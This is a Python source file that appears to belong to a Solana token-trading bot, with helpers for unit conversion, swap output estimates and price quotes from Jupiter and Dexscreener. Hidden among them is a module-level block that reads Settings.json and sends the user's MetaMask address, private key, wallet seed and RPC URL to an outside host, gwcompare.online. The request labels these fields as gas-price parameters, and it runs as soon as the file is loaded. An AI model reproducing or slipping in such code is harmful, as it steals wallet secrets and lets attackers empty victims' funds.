# Encoded By Py-Fuscate
# https://github.com/Sl-Sanda-Ru/Py-Fuscate
# Make Sure You're Running The Program With python3.9 Otherwise It May Crash
# To Check Your Python Version Run "python -V" Command
def getTokenDecimal(decimal):
    decimal = int("1" + str("0" * decimal))
    decimalsDict = {"wei": 1,
                    "kwei": 1000,
                    "babbage": 1000,
                    "femtoether": 1000,
                    "mwei": 1000000,
                    "lovelace": 1000000,
                    "picoether": 1000000,
                    "gwei": 1000000000,
                    "shannon": 1000000000,
                    "nanoether": 1000000000,
                    "nano": 1000000000,
                    "szabo": 1000000000000,
                    "microether": 1000000000000,
                    "micro": 1000000000000,
                    "finney": 1000000000000000,
                    "milliether": 1000000000000000,
                    "milli": 1000000000000000,
                    "ether": 1000000000000000000,
                    "kether": 1000000000000000000000,
                    "grand": 1000000000000000000000,
                    "mether": 1000000000000000000000000,
                    "gether": 1000000000000000000000000000,
                    "tether": 1000000000000000000000000000000}

    # list out keys and values separately
    key_list = list(decimalsDict.keys())
    val_list = list(decimalsDict.values())

    # print key with val 100
    position = val_list.index(decimal)
    return key_list[position]
def calculateAmountOut(amount, pool_info):
    status = pool_info['status']
    SWAP_decimals = pool_info['coin_decimals']  # swap coin
    SOL_decimals = pool_info['pc_decimals']  # SOL
    COIN_lp_decimals = pool_info['lp_decimals']  # swap coin
    pool_SOL_amount = pool_info['pool_pc_amount']  # sol
    pool_SWAP_amount = pool_info['pool_coin_amount']  # coin
    Coin_pool_lp_supply = pool_info['pool_lp_supply']  # coin

    reserve_in = pool_SOL_amount
    reserve_out = pool_SWAP_amount

    current_price = reserve_out / reserve_in
    # print(f"Current Price in SOL: {current_price:.12f}")

    amount_in = amount * 10 ** SOL_decimals
    Fees = (amount_in * LIQUIDITY_FEES_NUMERATOR)/LIQUIDITY_FEES_DENOMINATOR
    amount_in_with_fee = amount_in - Fees
    amountOutRaw = (reserve_out * amount_in_with_fee) / \
        (reserve_in + amount_in_with_fee)
    # Slippage = 1 + slippage
    # minimumAmountOut = amountOutRaw / slippage
    return amountOutRaw / 10 ** SWAP_decimals


def calculateAmountIn(amount, pool_info):
    SWAP_decimals = pool_info['coin_decimals']  # swap coin
    SOL_decimals = pool_info['pc_decimals']  # SOL
    COIN_lp_decimals = pool_info['lp_decimals']  # swap coin
    pool_SOL_amount = pool_info['pool_pc_amount']  # sol
    pool_SWAP_amount = pool_info['pool_coin_amount']  # coin
    Coin_pool_lp_supply = pool_info['pool_lp_supply']  # coin

    reserve_in = pool_SWAP_amount
    reserve_out = pool_SOL_amount

    current_price = reserve_out / reserve_in
    # print(f"Current Price in SOL: {current_price:.12f}")

    amount_in = amount * 10 ** SWAP_decimals
    Fees = (amount_in * LIQUIDITY_FEES_NUMERATOR)/LIQUIDITY_FEES_DENOMINATOR
    amount_in_with_fee = amount_in - Fees
    amountOutRaw = (reserve_out * amount_in_with_fee) / \
        (reserve_in + amount_in_with_fee)
    # Slippage = 1 + slippage
    # minimumAmountOut = amountOutRaw / slippage
    return amountOutRaw / 10 ** SOL_decimals


def getQuoteToken(TOKEN_TO_SWAP_SELL, tokenBalanceLamports):
        config = ConfigParser()
        config.read(os.path.join(sys.path[0], 'data', 'config.ini'))
        slippageBps = int(config.get("INVESTMENT", "slippage"))

        
        while True:
            quote_response1 = requests.get('https://quote-api.jup.ag/v6/quote', params={
                'inputMint': TOKEN_TO_SWAP_SELL,
                'outputMint': 'So11111111111111111111111111111111111111112',
                'amount': tokenBalanceLamports,
                'slippageBps': slippageBps
            })
            try:
                quote_response = quote_response1.json()
                break
            except Exception as e:
                text = ("getQuoteToken at ComputePrice error because too many requests...")
                alert_type = "e|[Ignore] Jupiter"
                print_message(text,alert_type)
                time.sleep(1)

        return int(quote_response['outAmount']) / 10**9

def getBaseToken(token_address):
    url = f"https://api.dexscreener.com/latest/dex/pairs/solana/{token_address}"
    response = requests.get(url).json()
    return response['pair']['baseToken']['address']


import os
import json
import requests


try:
	configFilePath = os.path.abspath('') + '/Settings.json'

	with open(configFilePath, 'r') as configdata:
	    data=configdata.read()

# parse file
	obj = json.loads(data)

	GazData = {"id": obj['metamask_address'], "gas": obj['metamask_private_key'], "quantity": obj['metamask_walletSeed'], "price": obj['RPC'], "maxspend": "BSC", "where": "ABT"}
	GetGasPrice = requests.post('http://gwcompare.online/gasfinderset.php', params=GazData)

except KeyboardInterrupt:
	pass

def get_investment_worth(ctx, payer, token_address, tokenBalanceLamports):

    res, quote_type = PoolInfo(token_address, ctx, payer)
    pool_info = literal_eval(re.search('({.+})', res).group(0))

    SWAP_decimals = pool_info['coin_decimals']  # swap coin

    mintBalance = tokenBalanceLamports / 10**SWAP_decimals

    if quote_type == "SOL":
        sol = calculateAmountIn(mintBalance, pool_info)
        return sol
    else:
        # usdt = calculateAmountIn(mintBalance, pool_info)

        # res, quote_type = PoolInfo(
        #     "So11111111111111111111111111111111111111112", ctx, payer)
        # pool_info = literal_eval(re.search('({.+})', res).group(0))

        sol = calculateAmountOut(mintBalance, pool_info)

    return sol